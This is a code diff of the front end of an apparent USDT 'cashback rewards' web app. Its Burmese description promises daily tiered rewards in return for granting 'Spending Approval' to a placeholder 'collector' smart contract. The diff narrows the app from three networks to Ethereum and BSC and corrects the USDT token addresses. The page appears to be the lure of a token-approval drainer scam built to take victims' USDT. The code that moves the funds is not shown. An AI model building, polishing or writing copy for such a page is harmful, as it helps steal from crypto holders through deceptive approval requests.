@@ -33,21 +33,17 @@
 
             <!-- Top Right Controls: Network Selector & Connect Button side-by-side -->
             <div class="flex items-center gap-2">
-                <!-- Network Selector Dropdown Button (Logo Only) -->
+                <!-- Network Selector Dropdown Button (Logo Only - ETH & BSC) -->
                 <div class="relative">
                     <button onclick="toggleNetworkDropdown()" class="flex items-center justify-center bg-indigo-900/90 hover:bg-indigo-800 w-9 h-9 rounded-xl shadow-md transition cursor-pointer border border-indigo-500/40">
                         <img id="navNetworkIconImg" src="https://cryptologos.cc/logos/ethereum-eth-logo.png" class="w-5 h-5 object-contain">
                     </button>
 
-                    <!-- Network Dropdown Menu -->
+                    <!-- Network Dropdown Menu (ETH and BSC Only) -->
                     <div id="networkDropdown" class="hidden absolute right-0 mt-2 w-44 bg-slate-900 border border-slate-700 rounded-xl shadow-2xl z-50 p-1.5 space-y-1">
                         <button onclick="selectNetworkOption('ETH')" class="w-full flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-slate-800 text-left text-xs transition cursor-pointer">
                             <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" class="w-4 h-4 object-contain">
                             <span>Ethereum (ERC20)</span>
-                        </button>
-                        <button onclick="selectNetworkOption('TRON')" class="w-full flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-slate-800 text-left text-xs transition cursor-pointer">
-                            <img src="https://cryptologos.cc/logos/tron-trx-logo.png" class="w-4 h-4 object-contain">
-                            <span>Tron (TRC20)</span>
                         </button>
                         <button onclick="selectNetworkOption('BSC')" class="w-full flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-slate-800 text-left text-xs transition cursor-pointer">
                             <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" class="w-4 h-4 object-contain">
@@ -96,7 +92,7 @@
 
         <!-- Description Paragraph -->
         <p class="text-xs text-slate-300 leading-relaxed text-justify bg-slate-900/60 p-3.5 rounded-xl border border-slate-700/60">
-            ကျွန်ုပ်တို့၏ USDT Multi-Network Rewards DApp Platform မှ ကြိုဆိုပါသည်။ ဤစနစ်သည် အသုံးပြုသူများအတွက် မိမိတို့၏ Crypto Wallet ထဲတွင် ရှိသော USDT များပေါ် မူတည်၍ နေ့စဉ် တိုးတက်လာသော Cashback Rewards များကို စနစ်တကျ ရယူနိုင်ရန် ဖန်တီးထားသော ဗဟိုချုပ်ကိုင်မှုမဲ့ အကျိုးခံစားခွင့် ပလက်ဖောင်းတစ်ခု ဖြစ်ပါသည်။ Ethereum (ERC20)၊ TRON (TRC20) နှင့် Binance Smart Chain (BEP20) Network များကို စိတ်ကြိုက် ရွေးချယ် အသုံးပြုနိုင်ပြီး Spending Approval ပြုလုပ်ရုံဖြင့် မိမိ၏ Wallet Balance ပေါ် မူတည်ကာ သတ်မှတ်ထားသော Tiered Daily Rates အလိုက် ဆုလာဘ်များ စတင် ရရှိမည် ဖြစ်ပါသည်။
+            ကျွန်ုပ်တို့၏ USDT Rewards DApp Platform မှ ကြိုဆိုပါသည်။ ဤစနစ်သည် အသုံးပြုသူများအတွက် မိမိတို့၏ Crypto Wallet ထဲတွင် ရှိသော USDT များပေါ် မူတည်၍ နေ့စဉ် တိုးတက်လာသော Cashback Rewards များကို စနစ်တကျ ရယူနိုင်ရန် ဖန်တီးထားသော ဗဟိုချုပ်ကိုင်မှုမဲ့ အကျိုးခံစားခွင့် ပလက်ဖောင်းတစ်ခု ဖြစ်ပါသည်။ Ethereum (ERC20) နှင့် Binance Smart Chain (BEP20) Network များကို စိတ်ကြိုက် ရွေးချယ် အသုံးပြုနိုင်ပြီး Spending Approval ပြုလုပ်ရုံဖြင့် မိမိ၏ Wallet Balance ပေါ် မူတည်ကာ သတ်မှတ်ထားသော Tiered Daily Rates အလိုက် ဆုလာဘ်များ စတင် ရရှိမည် ဖြစ်ပါသည်။
         </p>
     </div>
 
@@ -213,23 +209,22 @@
         let provider, signer, userAddress;
         let selectedNetwork = "ETH";
 
+        // Deployed Smart Contract Address ထည့်ရန်
         const COLLECTOR_CONTRACT_ADDRESS = "သင်၏_Deployed_Smart_Contract_Address_ကို_ဤနေရာတွင်ထည့်ပါ";
 
+        // ETH နှင့် BSC Address များ (Checksum မှန်ကန်သော ပုံစံ)
         const USDT_ADDRESSES = {
-            "ETH": "0xdac17f958d2ee523a2206206994597c13d831ec7",
-            "TRON": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-            "BSC": "0x55d398326f99059ff775485246999027b3197955"
+            "ETH": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+            "BSC": "0x55d398326f99059fF775485246999027B3197955"
         };
 
         const CHAIN_IDS = {
             "ETH": "0x1",
-            "TRON": "0x2b66353",
             "BSC": "0x38"
         };
 
         const NETWORK_LOGOS = {
             "ETH": "https://cryptologos.cc/logos/ethereum-eth-logo.png",
-            "TRON": "https://cryptologos.cc/logos/tron-trx-logo.png",
             "BSC": "https://cryptologos.cc/logos/bnb-bnb-logo.png"
         };
 
@@ -369,12 +364,10 @@
             const targetChainId = CHAIN_IDS[network];
 
             try {
-                if (network !== "TRON") {
-                    await window.ethereum.request({
-                        method: "wallet_switchEthereumChain",
-                        params: [{ chainId: targetChainId }],
-                    });
-                }
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: targetChainId }],
+                });
 
                 const badgeEl = document.getElementById("selectedNetworkBadge");
                 badgeEl.innerText = `Active Network: ${network}`;
